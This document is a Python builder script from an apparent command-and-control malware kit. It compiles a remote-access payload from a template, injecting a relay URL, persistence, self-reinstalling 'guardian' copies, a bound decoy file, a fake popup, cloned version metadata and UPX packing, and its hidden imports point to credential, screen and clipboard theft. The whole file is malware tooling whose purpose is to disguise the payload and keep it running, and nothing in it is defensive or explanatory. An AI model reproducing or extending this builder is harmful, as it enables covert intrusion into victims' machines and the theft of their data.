# C2_Client/builder.py
import os
import subprocess
import shutil
import tempfile
import sys
import base64
import json
import psutil
from pyinstaller_versionfile import create_versionfile
import pefile

def simple_log_filter(line):
    """A simple filter to make PyInstaller logs cleaner."""
    line_strip = line.strip().lower()
    if line_strip.startswith("pyinstaller:") or line_strip.startswith("python:"):
        return f"[INFO] {line.strip()}"
    if any(keyword in line_strip for keyword in ["bootloader", "analyzing", "building", "compiling", "bundling", "checking"]):
        return f"[Build] {line.strip()}"
    if line_strip.startswith('warn:'):
        return f"[Warning] {line.strip()}"
    return None # Ignore other verbose lines

def _compile_single_payload(settings, relay_url, c2_user, is_guardian, log_callback, thread_object):
    """A helper function to compile one payload and return its raw bytes or final path."""
    guardian_configs = settings.get("guardians", [])
    
    if is_guardian:
        # For a guardian, we use its specific config
        guardian_index = is_guardian - 1 # is_guardian will be 1, 2, 3...
        config = guardian_configs[guardian_index]
        pyinstaller_name = os.path.splitext(config.get("name"))[0]
        payload_full_name = config.get("name") + config.get("ext")
        persistence_flag = True # Guardians always persist
        hydra_flag = True # Guardians need the watchdog logic, but won't deploy children
    else:
        # For the main payload
        pyinstaller_name = os.path.splitext(settings.get("payload_name"))[0]
        payload_full_name = settings.get("payload_name") + settings.get("payload_ext")
        persistence_flag = settings.get("persistence", False)
        hydra_flag = settings.get("hydra", False)

    with tempfile.TemporaryDirectory() as temp_dir:
        temp_script_path = os.path.join(temp_dir, f"temp_payload_{pyinstaller_name}.py")
        template_path = "payload/template.py"
        try:
            with open(template_path, "r", encoding="utf-8") as f: code = f.read()
        except FileNotFoundError: log_callback("[ERROR] payload/template.py not found."); return None

        # --- Inject settings into the template ---
        code = code.replace("{{RELAY_URL}}", json.dumps(relay_url))
        code = code.replace("{{C2_USER}}", json.dumps(c2_user))
        code = code.replace("{{PERSISTENCE_ENABLED}}", str(persistence_flag))
        code = code.replace("{{HYDRA_ENABLED}}", str(hydra_flag))
        
        guardian_names_str = json.dumps([g['name'] + g['ext'] for g in guardian_configs])
        code = code.replace("{{GUARDIAN_NAMES}}", guardian_names_str)
        guardian_data_str = json.dumps(settings.get("_embedded_guardians_", []))
        code = code.replace("{{GUARDIAN_DATA_B64}}", guardian_data_str)
        
        code = code.replace("{{POPUP_ENABLED}}", str(settings.get("popup_enabled", False)))
        code = code.replace("{{POPUP_TITLE}}", json.dumps(settings.get("popup_title", "")))
        code = code.replace("{{POPUP_MESSAGE}}", json.dumps(settings.get("popup_message", "")))
        
        decoy_filename_val = ""
        decoy_data_b64_val = ""
        bind_path = settings.get("bind_path")
        
        if bind_path and os.path.exists(bind_path):
            decoy_filename_val = os.path.basename(bind_path)
            with open(bind_path, 'rb') as f:
                decoy_data_b64_val = base64.b64encode(f.read()).decode()
        
        code = code.replace("{{DECOY_ENABLED}}", str(bool(bind_path)))
        code = code.replace("{{DECOY_FILENAME}}", json.dumps(decoy_filename_val))
        code = code.replace("{{DECOY_DATA_B64}}", json.dumps(decoy_data_b64_val))
        
        with open(temp_script_path, "w", encoding="utf-8") as f: f.write(code)
        
        command = [sys.executable, "-m", "PyInstaller", '--onefile', '--windowed', '--name', pyinstaller_name]
        
        if settings.get("compression") == "Normal (UPX)":
            upx_path = os.path.abspath("upx.exe");
            if os.path.exists(upx_path): command.extend(['--upx-dir', os.path.dirname(upx_path)])
            else: log_callback("[WARNING] UPX selected but upx.exe not found.")
        
        cloning_settings = settings.get("cloning", {})
        icon_path = config.get("icon") if is_guardian else cloning_settings.get("icon")
        if icon_path and os.path.exists(icon_path): command.extend(['--icon', icon_path])
        
        if cloning_settings.get("enabled") and not is_guardian:
            version_file_path = os.path.join(temp_dir, "version.txt")
            create_versionfile(output_file=version_file_path, version=cloning_settings["version_info"].get("FileVersion", "1.0.0.0"), company_name=cloning_settings["version_info"].get("CompanyName", ""), file_description=cloning_settings["version_info"].get("FileDescription", ""), internal_name=cloning_settings["version_info"].get("OriginalFilename", ""), legal_copyright=cloning_settings["version_info"].get("LegalCopyright", ""), original_filename=cloning_settings["version_info"].get("OriginalFilename", ""), product_name=cloning_settings["version_info"].get("ProductName", "")); command.extend(['--version-file', version_file_path])

        # --- ADDED NEW HIDDEN IMPORTS ---
        hidden_imports = ['requests', 'psutil', 'win32crypt', 'mss', 'PIL', 'winreg', 'shutil', 'sqlite3', 'cryptography', 'Crypto.Cipher', 'pyperclip', 'xml.etree.ElementTree']
        for imp in hidden_imports: command.extend(['--hidden-import', imp])
        command.append(temp_script_path)
        
        process = subprocess.Popen(command, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0, encoding='utf-8', errors='ignore')
        thread_object.proc = process
        
        use_simple_logs = settings.get("simple_logs", True)
        for line in iter(process.stdout.readline, ''):
            if not thread_object._is_running: break
            if use_simple_logs:
                simple_msg = simple_log_filter(line)
                if simple_msg: log_callback(simple_msg)
            else:
                log_callback(line.strip())
        
        process.wait()
        
        if process.returncode == 0 and thread_object._is_running:
            built_exe_path = os.path.join(temp_dir, 'dist', f"{pyinstaller_name}.exe")
            with open(built_exe_path, "rb") as f:
                return f.read()
        return None

def build_payload(settings, relay_url, c2_user, log_callback, thread_object):
    """The main build orchestrator."""
    embedded_guardians = []
    if settings.get("hydra"):
        guardian_configs = settings.get("guardians", [])
        for i, guardian_config in enumerate(guardian_configs):
            log_callback(f"\n[Hydra] Building guardian #{i+1} ({guardian_config['name']}{guardian_config['ext']})...")
            guardian_bytes = _compile_single_payload(settings, relay_url, c2_user, i + 1, log_callback, thread_object)
            if not guardian_bytes or not thread_object._is_running:
                log_callback(f"[ERROR] Guardian #{i+1} build failed. Aborting.")
                return
            embedded_guardians.append({
                "filename": guardian_config['name'] + guardian_config['ext'],
                "data_b64": base64.b64encode(guardian_bytes).decode()
            })
            log_callback(f"[Hydra] Guardian #{i+1} built and encoded successfully.")

    log_callback("\n[Builder] Building main payload...")
    
    settings["_embedded_guardians_"] = embedded_guardians
    
    main_payload_bytes = _compile_single_payload(settings, relay_url, c2_user, False, log_callback, thread_object)

    if main_payload_bytes and thread_object._is_running:
        main_payload_full_name = settings.get("payload_name") + settings.get("payload_ext")
        output_dir = "output"
        if not os.path.exists(output_dir): os.makedirs(output_dir)
        final_exe_path = os.path.join(output_dir, main_payload_full_name)
        with open(final_exe_path, "wb") as f:
            f.write(main_payload_bytes)
        log_callback(f"\n[SUCCESS] Final payload '{main_payload_full_name}' saved to output folder.")
    elif thread_object._is_running:
        log_callback(f"\n[ERROR] Main payload build failed.")